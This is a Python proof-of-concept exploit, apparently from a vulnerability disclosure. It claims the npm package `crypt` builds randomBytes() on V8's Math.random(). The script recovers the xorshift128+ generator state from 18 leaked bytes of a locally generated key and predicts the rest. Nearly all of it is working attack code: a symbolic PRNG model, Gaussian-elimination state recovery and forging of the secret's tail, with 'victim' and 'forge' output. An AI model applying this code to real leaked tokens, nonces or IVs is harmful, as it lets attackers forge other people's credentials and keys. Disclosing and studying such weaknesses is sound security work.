#!/usr/bin/env python3
"""
ByteSeer — `crypt.randomBytes()` (npm package `crypt`, ~24M weekly downloads)
derives its "random" bytes from V8's Math.random(), a non-cryptographic
xorshift128+ PRNG. V8's PRNG is linear over GF(2): observing 18 bytes of a
secret (e.g. a leaked token prefix, a nonce printed to logs, part of an IV)
is enough to recover the generator state by Gaussian elimination and predict
EVERY remaining byte of the secret exactly.

Impact: any downstream project that generates keys, tokens, salts or IVs with
crypt.randomBytes() gets predictable secrets — attacker-observable prefixes
are all that is needed to forge the rest.

This PoC:
  1. runs `node secret_gen.js` to generate a 24-byte "API key" with the real
     `crypt` package (the first 18 bytes are assumed to leak as hex prefix),
  2. feeds the 18 observed bytes to the GF(2) state recovery below,
  3. predicts the remaining 6 bytes and compares against the real key.
"""
import json
import subprocess
import sys
import os

HERE = os.path.dirname(os.path.abspath(__file__))
MASK = (1 << 64) - 1
NSTATE = 128


# ---------------- V8 xorshift128+ inverse (concrete) ----------------
def _inv_rshift_xor(y, shift):
    x = y
    while True:
        nx = y ^ (x >> shift)
        if nx == x:
            return x
        x = nx


def _inv_lshift_xor(y, shift):
    x = y
    while True:
        nx = (y ^ ((x << shift) & MASK)) & MASK
        if nx == x:
            return x
        x = nx


def inv(ns0, ns1):
    s1 = ns0
    w = ns1 ^ s1 ^ (s1 >> 26)
    u = _inv_rshift_xor(w, 17)
    s0 = _inv_lshift_xor(u, 23)
    return s0 & MASK, s1 & MASK


def symbolic_step(s0, s1):
    """Forward step on SYMBOLIC state: lists of 64 GF(2) masks."""
    ns0 = list(s1)
    t = list(s0)
    t = [a ^ b for a, b in zip(t, [0] * 23 + t[:41])]       # t ^= t << 23
    t = [a ^ b for a, b in zip(t, t[17:] + [0] * 17)]       # t ^= t >> 17
    t = [a ^ b for a, b in zip(t, s1)]                      # t ^= s1
    t = [a ^ b for a, b in zip(t, s1[26:] + [0] * 26)]      # t ^= s1 >> 26
    return ns0, t


def recover_state(observed):
    """observed: bytes in CALL order; returns state before the oldest output
    in observed (V8's 64-value cache is consumed in reverse)."""
    gen = observed[::-1]
    s0 = [1 << j for j in range(64)]
    s1 = [1 << (j + 64) for j in range(64)]
    rows = []
    for byte in gen:
        s0, s1 = symbolic_step(s0, s1)
        for bit in range(8):               # top byte = bits 56..63 of state0
            rows.append((s0[56 + bit], (byte >> bit) & 1))

    # row echelon
    basis = {}
    for mask, rhs in rows:
        m, r = mask, rhs
        while m:
            p = m.bit_length() - 1
            if p in basis:
                m ^= basis[p][0]
                r ^= basis[p][1]
            else:
                basis[p] = (m, r)
                break
        if m == 0 and r == 1:
            raise ValueError("inconsistent equations")
    # Gauss-Jordan
    for p in sorted(basis):
        mp, rp = basis[p]
        for q in list(basis):
            if q != p and (basis[q][0] >> p) & 1:
                basis[q] = (basis[q][0] ^ mp, basis[q][1] ^ rp)
    sol = [0] * NSTATE
    for p, (m, r) in basis.items():
        sol[p] = r
    S0 = sum(sol[j] << j for j in range(64))
    S1 = sum(sol[64 + j] << j for j in range(64))
    return S0, S1


def predict_bytes(observed, n_future):
    a, b = recover_state(observed)
    out = []
    for _ in range(n_future):
        out.append((a >> 56) & 0xFF)
        a, b = inv(a, b)
    return out


def main():
    print("ByteSeer — crypt.randomBytes() is V8 Math.random(), fully predictable")
    print("=" * 72)

    # 1) generate the "secret" with the real npm `crypt` package
    out = subprocess.run(["node", os.path.join(HERE, "secret_gen.js")],
                         capture_output=True, text=True, timeout=60)
    if out.returncode != 0:
        print("node run failed:", out.stderr)
        return 1
    lines = out.stdout.strip().splitlines()
    key_hex = [l.split(": ")[1] for l in lines if l.startswith("FULL_KEY")][0]
    prefix_hex = [l.split(": ")[1] for l in lines if l.startswith("LEAKED_PREFIX")][0]
    full = bytes.fromhex(key_hex)
    prefix = bytes.fromhex(prefix_hex)
    print(f"[victim] full 24-byte key (secret): {full.hex()}")
    print(f"[leak]   hex prefix visible to attacker ({len(prefix)} bytes): "
          f"{prefix.hex()}")

    # 2) recover V8 state from the leaked prefix bytes and predict the rest
    observed = list(prefix)
    predicted = predict_bytes(observed, len(full) - len(observed))
    forged = bytes(predicted)
    print(f"[forge]  predicted remaining {len(forged)} bytes: {forged.hex()}")
    print(f"[actual] secret tail: {full[len(observed):].hex()}")

    ok = forged == full[len(observed):]
    print("\n" + "=" * 72)
    if ok:
        print("RESULT: PASS — attacker reconstructed the full key from its")
        print("         leaked prefix (0 key entropy beyond the observable)")
        return 0
    print("RESULT: FAIL")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
